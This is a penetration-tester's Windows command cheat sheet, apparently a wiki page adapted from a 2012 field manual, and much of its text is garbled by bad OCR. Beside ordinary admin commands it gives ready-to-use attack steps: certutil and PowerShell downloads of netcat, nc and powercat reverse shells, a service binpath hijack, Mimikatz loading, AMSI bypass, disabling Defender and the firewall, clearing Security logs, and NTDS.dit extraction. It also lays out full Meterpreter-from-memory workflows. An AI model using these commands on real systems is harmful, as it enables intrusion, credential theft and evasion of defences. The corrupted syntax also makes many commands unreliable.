---
title: Windows
sidebar: mydoc_sidebar
permalink: windows.html
folder: mydoc
---

# Windows

## Versions

<table>
  <thead>
    <tr>
       <th style="text-align:left"><b>Number or ID</b>
       </th>
       <th style="text-align:left"><b>Versions</b>
       </th>
     </tr>
  </thead>
  <tbody>
    <tr>
      <td style="text-align:left">NT 3.1</td>
      <td style="text-align:left">Windows NT 3.1 (All)</td>
    </tr>
    <tr>
      <td style="text-align:left">NT 3.5</td>
      <td style="text-align:left">Windows NT 3.5 (All)</td>
    </tr>
    <tr>
      <td style="text-align:left">NT 3.51</td>
      <td style="text-align:left">Windows NT 3.51 (All)</td>
    </tr>
    <tr>
      <td style="text-align:left">NT 4.0</td>
      <td style="text-align:left">Windows NT 4.0 (All)</td>
    </tr>
    <tr>
      <td style="text-align:left">NT 5.0</td>
      <td style="text-align:left">Windows 2000 (All)</td>
    </tr>
    <tr>
      <td style="text-align:left">NT 5.1</td>
      <td style="text-align:left">Windows XP (Home, Pro, MC, Tablet PC, Starter, Embedded)</td>
    </tr>
    <tr>
      <td style="text-align:left">NT 5.2</td>
      <td style="text-align:left">
        <p>Windows XP (64-bit, Pro 64-bit) Windows Server 2003 &amp; R2 (Standard,
          Enterprise)</p>
        <p>Windows Home Server</p>
      </td>
    </tr>
    <tr>
      <td style="text-align:left">NT 6.0</td>
      <td style="text-align:left">Windows Vista (Starter, Home, Basic, Home Premium, Business, Enterprise,
        Ultimate)</td>
    </tr>
    <tr>
      <td style="text-align:left">NT 6.1</td>
      <td style="text-align:left">Windows 7 (Starter, Home, Pro, Enterprise, Ultimate) Windows Server 2008
        R2 (Foundation, Standard, Enterprise)</td>
    </tr>
    <tr>
      <td style="text-align:left">NT 6.2</td>
      <td style="text-align:left">Windows 8 (x86/64, Pro, Enterprise, Windows RT (ARM)) Windows Phone 8
        Windows Server 2012 (Foundation, Essentials, Standard)</td>
    </tr>
  </tbody>
</table>

## Files

| **Command** | **Explanation** |
| :--- | :--- |
| %SYSTEMROOT% | Usually C:\Windows |
| %SYSTEMROOT%\System32\drivers\etc\hosts | DNS Entities |
| %SYSTEMROOT%\System32\drivers\etc\networks | Network settings
| %SYSTEMROOT% system32 config\SAM | Username and password hash
| %SYSTEMROOT%\repair\SAM | Copy of SAM |
| %SYSTEMROOT%\System32\config\RegBack\SAM | Backup copy of SAM |
| %WINDIR%\system32\config\AppEvent.Evt | Program reports
| %WINDIR%\system32\config\SecEvent.Evt | Security reports
| %ALLUSERSPROFILE%\Start Menu\Programs\Startup\ | Startup path
| %USERPROFILE%\Start Menu\Programs\Startup\ | Startup path
| %SYSTEMROOT%\Prefetch | Path Prefetch \(EXE reports\) |

## Launcher paths

### For WINDOWS NT 6.1,6.0

```text
# All users
%SystemDrive%\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup
# Specific users
%SystemDrive%\Users\%UserName%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup
```

### For WINDOWS NT 5.2, 5.1, 5.0

```text
%SystemDrive%\Documents and Settings\All Users\Start Menu\Programs\Startup
```

### FOR WINDOWS 9x

```text
%SystemDrive%\wmiOWS\Start Menu\Programs\Startup
```

### for WINDOWS NT 4.0, 3.51, 3.50

```text
%SystemDrive%\WINNT\Profiles\All Users\Start Menu\Programs\Startup
```

## System information commands



| **Command** | **Explanation** |
| :--- | :--- |
| version | Operating system version
| sc query state=all | Show services
| tasklist /svc | Show process and services
| tasklist /m | Show all processes and dlls
| tasklist /S ip /v | Remotely running processes
| taskkill /PID pid /F | Forced removal of the process
| systeminfo /S ip /U domain\user /P Pwd | Receive system information remotely
| reg query \\ ip \ RegDomain \ Key /v VALUE | Send a query to the registry, /s=all values |
| reg query HKLM /f password /t REG\_SZ /s | Registry search for passwords
| reg query HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate /v WUServer HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\WindowsUpdate | WSUS address
| fsutil fsinfo drives | List of drivers • need admin access
| dir /a /s /b c:\'.pdf' | Search for all pdf files
| dir /a /b c:\windows\kb' | Search for patches
| findstr /si password' .txt I •.xmll •.xls | Search files for passwords
| tree /F /A c: tree.txt | List of folders on drive C: |
| reg save HKLM\Security security.hive | Save security hives inside the file
| echo %USERNAME% | Current user
| whoami /priv | Current user permissions

## command net/domain



<table>
   <thead>
     <tr>
       <th style="text-align:left"><b>Command</b>
       </th>
       <th style="text-align:left"><b>Description</b>
       </th>
     </tr>
   </thead>
   <tbody>
     <tr>
       <td style="text-align:left">net view /domain</td>
       <td style="text-align:left">Current domain host </td>
     </tr>
     <tr>
       <td style="text-align:left">net view /domain: [MYDOMAIN]</td>
       <td style="text-align:left">hosts in [MYDOMAIN]</td>
     </tr>
     <tr>
       <td style="text-align:left">net user /domain</td>
       <td style="text-align:left">All users of the current domain</td>
     </tr>
     <tr>
       <td style="text-align:left">net user user pass /add</td>
       <td style="text-align:left">Add user</td>
     </tr>
     <tr>
       <td style="text-align:left">net localgroup &quot;Administrators&quot; user /add</td>
       <td style="text-align:left">Add user to Administrators</td>
     </tr>
     <tr>
       <td style="text-align:left">net accounts /domain</td>
       <td style="text-align:left">Domain password policies</td>
     </tr>
     <tr>
       <td style="text-align:left">net localgroup &quot;Administrators&quot;</td>
       <td style="text-align:left">List of Local Admins</td>
     </tr>
     <tr>
       <td style="text-align:left">net group /domain</td>
       <td style="text-align:left">List of domain groups</td>
     </tr>
     <tr>
       <td style="text-align:left">net group &quot;Domain Admins&quot; /domain</td>
       <td style="text-align:left">List of Admin users in the domain</td>
     </tr>
     <tr>
       <td style="text-align:left">net group &quot;Domain Controllers&quot; /domain</td>
       <td style="text-align:left">List of DCs for the current domain</td>
     </tr>
     <tr>
       <td style="text-align:left">net share</td>
       <td style="text-align:left">SMB share</td>
     </tr>
     <tr>
       <td style="text-align:left">net session I find I &quot;\&quot;</td>
       <td style="text-align:left">List of active SMB sessions</td>
     </tr>
     <tr>
      <td style="text-align:left">net user user /ACTIVE:yes /domain</td>
       <td style="text-align:left">Open domain domain</td>
     </tr>
     <tr>
       <td style="text-align:left">net user user &apos;&apos; newpassword &apos;&apos; /domain</td>
       <td style="text-align:left">Change domain username and password</td>
     </tr>
     <tr>
       <td style="text-align:left">
         <p>net share share c:\share</p>
         <p>/GRANT:Everyone,FULL</p>
       </td>
       <td style="text-align:left">Shared folder</td>
     </tr>
  </tbody>
</table>

## Remote commands

<table>
   <thead>
     <tr>
       <th style="text-align:left"><b>Command</b>
       </th>
       <th style="text-align:left"><b>Description</b>
       </th>
     </tr>
   </thead>
   <tbody>
     <tr>
       <td style="text-align:left">tasklist /S ip /v</td>
       <td style="text-align:left">Processes running on ip</td>
     </tr>
     <tr>
       <td style="text-align:left">systeminfo /S ip /U domain\user /P Pwd</td>
       <td style="text-align:left">IP information</td>
     </tr>
     <tr>
       <td style="text-align:left">net share \\ ip</td>
       <td style="text-align:left">ip environment</td>
     </tr>
     <tr>
       <td style="text-align:left">net use \\ ip</td>
       <td style="text-align:left">ip system file</td>
     </tr>
    <tr>
      <td style="text-align:left">
        <p>net use z: \\ ip \share password</p>
        <p>/user: DOMAIN user</p>
      </td>
      <td style="text-align:left">
        <p>Map drive, specified</p>
        <p>credentials</p>
      </td>
    </tr>
   <tr>
       <td style="text-align:left">reg add \\ ip \ regkey \ value</td>
       <td style="text-align:left">Added registry key for ip</td>
     </tr>
     <tr>
       <td style="text-align:left">
         <p>sc \\ ip create service</p>
         <p>binpath=C:\Windows\System32\x.exe start=auto</p>
       </td>
       <td style="text-align:left">
         <p>Create a remote service</p>
         <p>(space after start=)</p>
       </td>
     </tr>
      <tr>
       <td style="text-align:left">cmd.exe /c certutil -urlcache -split -f http://ip/nc.exe c:/windows/temp/nc.exe</td>
       <td style="text-align:left">Copy file from ip to current system by cmd.exe</td>
     </tr>
     <tr>
       <td style="text-align:left">cmd.exe /c c:/windows/temp/nc.exe ip port -e cmd.exe</td>
       <td style="text-align:left">Shell reverse</td>
     </tr>
     <tr>
       <td style="text-align:left">nc.exe -lvvp port</td>
       <td style="text-align:left">Listening on specific port </td>
     </tr>
     <tr>
       <td style="text-align:left">python3 -m http.server port</td>
       <td style="text-align:left">Create webserver</td>
     </tr>
     <tr>
       <td style="text-align:left">xcopy /s \\ ip \dir C:\local</td>
       <td style="text-align:left">Copy of ip fodder</td>
     </tr>
     <tr>
       <td style="text-align:left">shutdown /m \\ ip /r /t 0 /f</td>
       <td style="text-align:left">restart system with ip</td>
     </tr>
  </tbody>
</table>

## Network commands

<table>
   <thead>
     <tr>
       <th style="text-align:left"><b>Command</b>
       </th>
       <th style="text-align:left"><b>Description</b>
       </th>
     </tr>
   </thead>
   <tbody>
     <tr>
       <td style="text-align:left">ipconfig I all</td>
       <td style="text-align:left">ip settings</td>
     </tr>
     <tr>
       <td style="text-align:left">ipconfig /displaydns</td>
       <td style="text-align:left">DNS cache</td>
     </tr>
     <tr>
       <td style="text-align:left">netstat -ana</td>
       <td style="text-align:left">Show connection</td>
     </tr>
     <tr>
       <td style="text-align:left">netstat -anop tcp 1</td>
       <td style="text-align:left">Create Netstat loop</td>
     </tr>
     <tr>
       <td style="text-align:left">netstat -ani findstr LISTENING</td>
       <td style="text-align:left">Ports in use</td>
     </tr>
     <tr>
       <td style="text-align:left">route print</td>
       <td style="text-align:left">Route tables</td>
     </tr>
     <tr>
       <td style="text-align:left">arp -a</td>
       <td style="text-align:left">Get system MACs (using ARP table)</td>
     </tr>
    <tr>
       <td style="text-align:left">
         <p>nslookup, set type=any, ls -d domain</p>
         <p>results.txt, exit</p>
       </td>
       <td style="text-align:left">Get DNS Zone Xfer</td>
     </tr>
     <tr>
       <td style="text-align:left">nslookup -type=SRV _www._tcp.url.com</td>
       <td style="text-align:left">Get Domain SRV lookup (ldap, kerberos, sip)</td>
     </tr>
     <tr>
       <td style="text-align:left">tftp -I ip GET remotefile</td>
       <td style="text-align:left">File Transfer in TFTP</td>
     </tr>
     <tr>
       <td style="text-align:left">netsh wlan show profiles</td>
       <td style="text-align:left">Profiles stored on the wireless network</td>
     </tr>
     <tr>
       <td style="text-align:left">netsh firewall set opmode disable</td>
       <td style="text-align:left">Firewall deactivation (&apos;Old)</td>
     </tr>
     <tr>
       <td style="text-align:left">netsh wlan export profile folder=. key=clear</td>
       <td style="text-align:left">wifi extraction in plaintext</td>
     </tr>
     <tr>
       <td style="text-align:left">netsh interface ip show interfaces</td>
       <td style="text-align:left">List of IDs/MTUs related to interfaces</td>
     </tr>
     <tr>
       <td style="text-align:left">
         <p>netsh interface ip set address local static</p>
         <p>ip nmask gw ID</p>
       </td>
       <td style="text-align:left">Set IP</td>
     </tr>
     <tr>
       <td style="text-align:left">netsh interface ip set dns local static ip</td>
       <td style="text-align:left">DNS server configuration</td>
     </tr>
     <tr>
       <td style="text-align:left">netsh interface ip set address local dhcp</td>
       <td style="text-align:left">Set interface to use DHCP</td>
     </tr>
  </tbody>
</table>

## Functional commands



<table>
   <thead>
     <tr>
       <th style="text-align:left"><b>Command</b>
       </th>
       <th style="text-align:left"><b>Description</b>
       </th>
     </tr>
   </thead>
   <tbody>
     <tr>
       <td style="text-align:left">type file</td>
       <td style="text-align:left">Show file contents</td>
     </tr>
     <tr>
       <td style="text-align:left">del path \&apos; .&#x2022; /a /s /q /f</td>
       <td style="text-align:left">Delete files in current path</td>
     </tr>
     <tr>
       <td style="text-align:left">
         <p>find /I &apos;&apos;str&apos;&apos; filename</p>
         <p>command I find /c /v &quot;&quot;</p>
       </td>
       <td style="text-align:left">List of cmd outputs</td>
     </tr>
     <tr>
       <td style="text-align:left">at HH:MM file [args] (i.e. at 14:45 cmd /c)</td>
       <td style="text-align:left">File execution schedule</td>
     </tr>
     <tr>
       <td style="text-align:left">runas /user: user &quot; file [args]&quot;</td>
       <td style="text-align:left">Execute file with specific user</td>
     </tr>
     <tr>
       <td style="text-align:left">restart /r /t 0</td>
       <td style="text-align:left">Restart</td>
     </tr>
     <tr>
       <td style="text-align:left">sc stop UsoSvc</td>
       <td style="text-align:left">Stop the UsoSvc service</td>
     </tr>
    <tr>
      <td style="text-align:left">sc start UsoSvc</td>
<td style="text-align:left">Starting the UsoSvc service</td>
    </tr> 
    <tr>
      <td style="text-align:left">sc config UsoSvc binpath="c:\windows\temp\nc.exe ip port -e C:\windows\system32\cmd.exe"       </td>
<td style="text-align:left">Change path of executable file by UsoSvc</td>
    </tr> 
    <tr>
      <td style="text-align:left">tr -d &apos;\15\32&apos; win.txt unix.txt</td>
      <td style="text-align:left">Delete CR &amp; &apos;Z (&apos;nix)</td>
    </tr>
    <tr>
      <td style="text-align:left">makecab file</td>
<td style="text-align:left">Compression</td>
    </tr>
    <tr>
      <td style="text-align:left">Wusa.exe /uninstall /kb: ###</td>
      <td style="text-align:left">Delete patch</td>
    </tr>
    <tr>
      <td style="text-align:left">
        <p>cmd.exe &quot;wevtutil qe Application /c:40</p>
        <p>/f:text /rd:true&quot;</p>
      </td>
<td style="text-align:left">Using the Event Viewer in the CLI</td>
    </tr>
    <tr>
      <td style="text-align:left">lusrrngr.msc</td>
<td style="text-align:left">Using Local user manager</td>
    </tr>
    <tr>
      <td style="text-align:left">services.msc</td>
<td style="text-align:left">Using Services control panel</td>
    </tr>
    <tr>
      <td style="text-align:left">taskmgr.exe</td>
<td style="text-align:left">Using Task manager</td>
    </tr>
    <tr>
      <td style="text-align:left">secpool.rnsc</td>
<td style="text-align:left">Using Security policy manager</td>
    </tr>
    <tr>
      <td style="text-align:left">eventvwr.rnsc</td>
<td style="text-align:left">Using Event viewer</td>
    </tr>
  </tbody>
</table>


## MISC. commands

### Locking the workstation

```text
rundll32.dll user32.dll LockWorkstation
```

### Disable Windows Firewall

```text
netsh advfirewall set currentprofile state off netsh advfirewall set allprofiles state off
```

### Create port forward \(\*need admin access\)

```text
netsh interface portproxy add v4tov4 listenport=3000 listenaddress=l.l.l.l connectport=4000 connectaddress=2.2.2.2
#Remove
netsh interface portproxy delete v4tov4 listenport=3000 listenaddress=l.l.l.l
```

### enable cmd

```text
reg add HKCU\Software\Policies\t1icrosoft\Windows\System /v DisableCHD /t REG DWORD /d 0 /f
```

## PSEXEC command

### Remote file execution with specific identity information

```text
psexec /accepteula \\ targetiP -u domain\user -p password -c -f \\ smbiP \share\file.exe
```


### Execution of command with special hash

```text
psexec /accepteula \\ ip -u Domain\user -p Lt1 c:\Program-1
```

### Run the command on the remote system

```text
psexec /accepteula \\ ip -s cmd.exe
```

## Terminal service \(RDP\)

### Start RDP

```text
Create regfile.reg file with following line in it: HKEY LOCAL t1ACHINE\SYSTEH\CurrentControlSet \Control\ TerminalService 
"fDenyTSCo~nections"=dword: 00000000
reg import reg file. reg 
net start ''terrnservice'' 
sc config terrnservice start= auto 
net start terrnservice 

    --OR--
reg add "HKEY LOCAL t1ACHINE\SYSTEH\CurentControlSet\Control \Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f
```

### RDP tunnel from port 443 (need to restart the terminal service)

```text
REG ADD "HKLt1\System\CurrentControlSet\Control \Terminal Server\WinStations\RDP-Tcp" /v PortNumber /t REG_DWORD /d 443 /f 
```

### Remove network authentication by adding an exception in the firewall

```text
reg add "HKEY LOCAL t1ACHINE\SYSTEt1\CurentControlSet\Control \Terminal
Server\WinStations\RDP-TCP" /v UserAuthentication /t REG_DWORD /d "0" /f 

netsh firewall set service type = remotedesktop mode = enable 
```

### Import task from XML file

```text
schtasks.exe /create /tn t1yTask /xml "C:\MyTask.xml" /f
```

## WMIC command

<table>
   <thead>
     <tr>
       <th style="text-align:left"><b>Command</b>
       </th>
       <th style="text-align:left"><b>Description</b>
       </th>
     </tr>
   </thead>
   <tbody>
     <tr>
       <td style="text-align:left">wmic [alias] get /?</td>
       <td style="text-align:left">List of all features</td>
     </tr>
     <tr>
       <td style="text-align:left">wmic [alias] call /?</td>
       <td style="text-align:left">Callable method</td>
     </tr>
     <tr>
       <td style="text-align:left">wmic process list full</td>
       <td style="text-align:left">process properties</td>
     </tr>
     <tr>
       <td style="text-align:left">wmic startupwmic service</td>
       <td style="text-align:left">start wmic service</td>
     </tr>
     <tr>
       <td style="text-align:left">wmic ntdomain list</td>
       <td style="text-align:left">Domain and DC information</td>
     </tr>
     <tr>
       <td style="text-align:left">wmic qfe</td>
       <td style="text-align:left">List of all patches</td>
     </tr>
     <tr>
       <td style="text-align:left">wrnic process call create &quot;process_name&quot;</td>
       <td style="text-align:left">Run process</td>
     </tr>
    <tr>
       <td style="text-align:left">
         <p>wmic process where name=&quot;process&quot; call</p>
         <p>terminate</p>
       </td>
       <td style="text-align:left">Delete process</td>
     </tr>
     <tr>
       <td style="text-align:left">wmic logicaldisk get description,name</td>
       <td style="text-align:left">Display logical sharing environment</td>
     </tr>
     <tr>
       <td style="text-align:left">wmic cpu get DataWidth /format:list</td>
       <td style="text-align:left">Show 32-bit or 64-bit version of the system</td>
     </tr>
    <tr>
       <td style="text-align:left">wmic service where started = true get name, startname</td>
       <td style="text-align:left">Show running services</td>
     </tr>
  </tbody>
</table>

### WMIC \[alias\] \[where\] \[clause\]

```text
[alias] == process, share, startup, service, nicconfig, useraccount, etc. 
[where] ==where (name="cmd.exe"), where (parentprocessid!=[pid]"), etc. 
[clause] ==list [fulllbrief], get [attribl, attrib2], call [method], delete
```

### Run the file in smb with specific identity information

```text
wmic /node: targetiP /user:domain\user /password:password process call create "\ \ smbiP \share\evil.exe" 
```

### Remove the software

```text
wmic product get name /value # Get software names 
wmic product where name="XXX" call uninstall /nointeractive 
```

### Remote user access

```text
wmic /node:remotecomputer computersystern get username 
```

### Show processes in real time

```text
wmic /node:machinename process list brief /every:l 
```

### Start RDP

```text
wmic /node:"machinename 4" path Win32_TerminalServiceSetting where 
AllowTSConnections=''O'' call SetAllowTSConnections ''1''
```

### The list of times that the user has entered

```text
wmic netlogin where (name like "%adm%") get numberoflogons 
```

### Search services for unquoted routes

```text
wmic service get narne,displayname,pathnarne,startrnode 
| findstr /i nauton | findstr /i /v "C:\windows\\" | findstr /i /v """
```

### Copy of Volume shadow

```text
1. wmic /node: DC IP /user:"DOI1AIN\user" /password:"PASS" process 
   call create "cmd /c vssadmin list shadows 2 &1 
   c:\temp\output.txt" 
# If any copies alread1 ex~st then exfil, otherwise create using 
following commands. Check output.txt for anJ errors 
2. wmic /node: DC IP /user:"DOMAIN\user" /password:"PASS" process 
   call create "cmd /c vssadmin create shadow /for=C: 2 &1 
   C:\temp\output.txt" 
3. wmic /node: DC IP /user:"DOMAIN\user" /password:"PASS" process 
   call create "cmd /c copy \\?\GLOBALROOT\Device\HarddiskVol~meShadowCopy1\Windows\System32\co nfig\SYSTEM 
   C:\temp\system.hive 2 &1  
   C:\temp\output.txt" 
4. wmic /node: DC IP /user: "DOl'.llUN\user" /password: "PASS" process call create ''cmd /c copy 
   \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopyc\NTDS\NTDS.dit 
   C:\temp\ntds.dit 2 &1 C:\temp\output.txt" 
Step by step instructions on room362.com for step below 
5. From Linux, download and run ntdsxtract and libesedb to export 
   hashes or other domain information 
   a. Additional instructions found under the VSSOWN section 
   b. ntdsxtract - http://www.ntdsxtract.com 
   c. libesedb - http://code.google.com/p/libesedb/ 
```

## POWERSHELL environment

| **Command** | **Description** |
| :--- | :--- |
| stop-transcript | Stop recording
| get-content file | Display the contents of the file
| get-help command-examples | Display sample command
| get-command 'string' | Search for cmd |
| get-service | Show services \(stopservice, start-service\) |
| get-wmiobject -class win32 service | Show services with the same identity information |
| $PSVersionTable | Show powershell version
| powershell.exe -version 2.0 | Run powershell 2.0 from version 3.0 |
| get-service measure-object | Information returned from the service
| get-psdrive | List returned from PSDrives |
| get-process select -expandproperty name |show names |
| get-help '-parameter credential | Receive identity information
| get-wmiobject -list -'network' | WMI available on the network
| \(Net.DNS\]: :GetnostEntry\(" ip "I | Process DNS Lookup |
| powershell.exe wget "http://10.10.10.10/nc.exe" -outfile "c:\temp\nc.exe" | Download and save the file
| poweshell.exe -c "IEX (New-Object System.Net.WebClient).DownloadString('http://10.10.10.10:8000/powercat.ps1'); powercat -c 10.10.10.100 -p 4444 -e cmd | reverse loose |
| https://gist.githubusercontent.com/zhilich/b8480f1d22f9b15d4fdde07ddc6fa4ed/raw/8078a51bbfa18df36d8e890fefe96a06891dd47d/SimpleHttpServer.ps1 | Web server with port 8050
| https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1 | Use mimikatz |
| call ps1 files | Import-Module .\Invoke-Mimikatz.ps1 |
| Download and save the file iwr -uri http://10.10.10.10/file -o file.exe |


### Bypass AMSI

```text
Import-Module .\Invoke-Obfuscation\Invoke-Obfuscation.psm1
Out-ObfuscatedTokenCommand -Path .\powerview.ps1 | Out-File out
```

Or

```text
https://raw.githubusercontent.com/kmkz/Pentesting/master/AMSI-Bypass.ps1
. .\AMSI-Bypass.ps1
Invoke-AmsiBypass
```

### Disable realtimemonitoring

```text
powershell -command set-mpppreference -Disable realtimemonitoring $true
```

### List of all users

```text
$users = New-Object DirectoryServices.DirectorySearcher
$users.Filter = "(&(objectclass=user))"
$users.SearchRoot = ''
$users.FindAll()
```

### List of all domains

```text
$computers = New-Object DirectoryServices.DirectorySearcher
$computers.Filter = "(&(objectclass=computer))"
$computers.SearchRoot = ''
$computers.FindAll()
```


### Get AD credentials using donotrequirepreauth

```text
Set-ADAccountControl -identity jorden -doesnotrequirepreauth 1
```

### Deleting security reports and programs (for SVR01)

```text
Get-EventLog -list 
Clear-EventLog -logname Application, Security -computername SVR01 
```

### Extract the version of the operating system inside the CSV file

```text
Get-WmiObject -class win32 operatingsystem | select -property ' | 
export-csv c:\os.txt
```

### List of running services

```text
Get-Service | where_object {$_.status -eq "Running"} 
```

### Using ps drive for permanent sharing

```text
New-PSJrive -Persist -PSProvider FileSjstem -Root \\1.1.1.1\tools -Name i 
```

### Files written on 8/20

```text
Get-Childitem -Path c:\ -Force -Rec~rse -Filter '.log -ErrorAction
SilentlyContinue | where {$_.LastWriteTime -gt "2012-08-20"} 
```

### Get file from http

```text
(new-object sjstem.net.webclient).downloadFile(''url'',''dest'')
```

### tcp port connections (scanner)

```text
$ports=(#,#,#) ;$ip="x.x.x.x";foreach ($port in $ports) {try
($socket=New-object Sjstem.Net.Sockets.TCPClient($ip,$port); }catch(};
if ($socket -eq $NULL) (echo $ip":"$port"- Closed";}
else(echo $ip":"$port"- Open";$socket =$NULL;}}
```

### Ping command with 500 millisecond timeout

```text
$ping = New-Object Sjstex.Net.Networkinformation.ping
$ping.Send(''ip'',5JO)
```

### Basic authentication window

```text
powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass
$Host.UI.PromptForCredential(" title "," message "," user" "," domain")
```

### Run the exe file \(from cmd.exe\) every 4 hours between August 8-11, 2013, device 0800-1700

```text
powershell. exe -Command "do {if ((Get-Date -format yyyyMMdd-HHmm) -match
'201308 ( 0 [ 8-9] |1 [0-1])-(0[ 8-9]]|1 [ 0-7]) [ 0-5] [ 0-9]') {Start-Process -
WindowStyle Hidden "C:\Temp\my.exe";Start-Sleep -s 14400))while(1)"
```

### Run Powershell as

```text
$pw ~ convertto-securestring -string "PASSWORD" -asplaintext -force;
$pp ~ new-object -typename System.Management.Automation.PSCredential -
argument list "DOMAIN\user", $pw;
Start-Process powershell -Credential $pp -ArgumentList '-noprofile -command
&{Start-Process file.exe -verb runas)'
```

### Email sender

```text
powershell.exe Send-l-1ai1Hessage -to "email" -from "email" -subject
"Subject" -a "attachment file path" -body "Body" -SmtpServer Target
Email Server IP
```

### Activating remote access to powershell \(requires identity information\)

```text
net time \\ip
at \\ip time "Powershell -Command 'Enable-PSRemoting -Force'"
at \\ip time+1 "Powershell -Command 'Set-Item
wsman:\localhost\client\trustedhosts ''"
at \ \ip time+2 "Powershell -Command 'Restart-Service WinRM'"
Enter-PSSession -ComputerName ip -Credential username
```


### hostname and ip list for all domains

```text
Get-WmiObject -ComputerName DC -Namespace root\microsoftDNS -Class 
MicrosoftDNS _ ResourceRecord -Filter "domainname~' DOMAIN '" | select 
textrepresentation 
```

### Download from Powershell from specific path

```text
powershell.exe -noprofile -noninteractive -command 
"[System.Net.ServicePointManager] ::ServerCertificateValidationCallback = 
{$true); $source="""https:ll YOUR SPECIFIED IP I file.zip """; 
$destination="C:\rnaster.zip"; $http = new-object Systern.Net.WebClient;
$response= $http.DownloadFile($source, $destination);" 
```

### Display Powershell data

```text
Script will send a file ($filepath) via http to server ($server) via POST request. 
Must have web server listening on port designated in the $server
 
powershell.exe -noprofile -noninteractive -command 
"[S;stem.Net.ServicePointManager] ::ServerCertificateValidationCallback = 
{$true); $server="""http:// YOUR_SPECIFIED IP / folder """;
$filepath="C:\master.zip" $http= new=object System.Net.WebClient;
$response= $http.UploadFile($server,$filepath);" 
```

## Using powershell to run meterpreter from memory

```text
Need Metasploit v4.5+ (msfvenom supports Powershell) 
Use Powershell (x86) with 32 bit Meterpreter payloads 
encodeMeterpreter.psl script can be found on next page 
```

### in the attacking system

```text
1. ./msfvenom -p Wlndows/meterpreter/reverse https -f psh -a x86 LHOST=1.1.1.1 LPORT=443 audit.psl 
2. Move audit.psl into same folder as encodeMeterpreter.psl 
3. Launch Powershell (x86) 
4. powershell.exe -executionpolicy bypass encodeMeterpreter.psl 
5. Copy the encoded Meterpreter string
```

### Start the listener in the attacking system

```text
1. ./msfconsole 
2. use exploit/multi/handler 
3. set payload windows/meterpreter/reverse https 
4. set LHOST 1. 1. 1. 1 
5. set LPORT 443 
6. exploit -j 
```

### On the target system \(run powershell\(x86\)\)

```text
1. powershell. exe -noexi t -encodedCommand paste encoded Meterpreter 
string here 
PROFIT 
```

### Encodemeterpreter.ps1 \[7\]

```text
# Get Contents of Script
$contents = Get-Content audit.psl
# Compress Script
$ms = New-Object IO.MemoryStream
$action = [IO.Compression.CompressionMode]: :Compress
$cs =New-Object IO.Compression.DeflateStream ($ms,$action)
$sw =New-Object IO.StreamWriter ($cs, [Text.Encoding] ::ASCII)
$contents I ForEach-Object {$sw.WriteLine($ I)
$sw.Close()
# Base64 Encode Stream
$code= [Convert]: :ToBase64String($ms.ToArray())
$command= "Invoke-Expression '$(New-Object IO.StreamReader('$(New-Object
IO. Compression. DeflateStream ('$(New-Object IO. t4emoryStream
(, '$ ( [Convert] : : FromBase64String ('"$code'") ) I I ,
[IO.Compression.Compressiont~ode]: :Decompress) I,
[Text.Encoding]: :ASCII)) .ReadToEnd() ;"
# Invoke-Expression $command
$bytes= [System.Text.Encoding] ::Unicode.GetBytes($command)
$encodedCommand = [Convert]: :ToBase64String($bytes)
# Write to Standard Out
Write-Host $encodedCommand
```

Copyright 2012 TrustedSec, LLC. All rights reserved.   
Please see reference \[7\] for disclaimer

## Using powershell to start meterpreter \(second method\)

### On bt attack box

```text
1. msfpayload windows/rneterpreter/reverse tcp LHOST=10.1.1.1
LPORT~8080 R I msfencode -t psh -a x86
```

### in the attacking system

```text
1. c:\powershell
2. PS c:\ $cmd = 'PASTE THE CONTENTS OF THE PSH SCRIPT HERE'
3. PS c:\ $u = [System.Text.Encoding]: :Unicode.GetBytes($crnd)
4. PS c: \ $e = [Convert] ::ToBase64String($u)
5. PS c:\ $e
6. Copy contents of $e
```

### Start the listener in the attacking system

```text
1. ./msfconsole
2. use exploit/multi/handler
3. set payload windows/meterpreter/reverse tcp
4. set LHOST 1.1.1.1
5. set LPORT 8080
6. exploit -j
```

### In the target system \(1: download the shell code, 2: execute\)

```text
1. c: \ powershell -noprofile -noninteracti ve -command " &
     {$client=new-object
     System.Net.WebClient; $client.DownloadFile('http://1.1.1.1/shell.txt
     ', 'c:\windows\temp\shell.txt') )"
2. c: \ powershell -noprofile -noninteracti ve -noexi t -command " &
     {$crnd~tjpe 'c:\windows\temp\shell.txt';powershell -noprofilenoninteractive
     -noexit -encodedCornmand $cmd} "
PROFIT
```

### Identification of vulnerable domains with powerup

```text
https://github.com/PowerShellEmpire/PowerTools/blob/master/PowerUp/PowerUp.ps1
. .\PowerUp.ps1
```

## Windows registry

### operating system information

```text
HKLM\Software\Microsoft\Windows NT\CurrentVersion
```

### Product Name

```text
HKLM\Software\Microsoft\Windows NT\CurrentVersion /v
ProductNarne
```

### Installation Date

```text
HKLM\Software\Microsoft\Windows NT\CurrentVersion /v InstallDate
```

### registered name

```text
HKLM\Software\Microsoft\Windows NT\CurrentVersion /v RegisteredOwner
```

### System boot information

```text
HKLM\Software\~icrosoft\Windows NT\CurrentVersion /v SystemRoot
```

### Time zone information (in minutes from UTC)

```text
HKLM\System\CurrentControlSet\Control\TimeZoneinformation /v ActiveTirneBias
```

### Map of network drivers

```text
HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\Map Network Drive
MRU
```

### Mounted devices

```text
HKLM\System\MountedDevices
```


### usb devices

```text
HKLM\System\CurrentControlSet\Enurn\USBStor
```

### Activation of IP forwarding

```text
HKEY_LOCAL_~ACHI~E\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters -
IPEnableRouter = 1
```

### Password keys: LSA secret cat certain vpn, autologon, other passwords

```text
HKEY LOCAL MACHINE\Security\Policy\Secrets
HKCU\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\autoadminlogon
```

### Audit policy information

```text
HKLM\Security\Policy\PolAdTev
```

### Kernel and user services

```text
HKLM\Software\Microsoft\Windows NT\CurrentControlSet\Services
```

### software installed in the system

```text
HKLM\Software
```

### Installed software for the user

```text
HKCU\Software
```

### Latest documents

```text
HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\RecentDocs
```

### The last positions of the user

```text
HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\ComDlg32\LastVisite
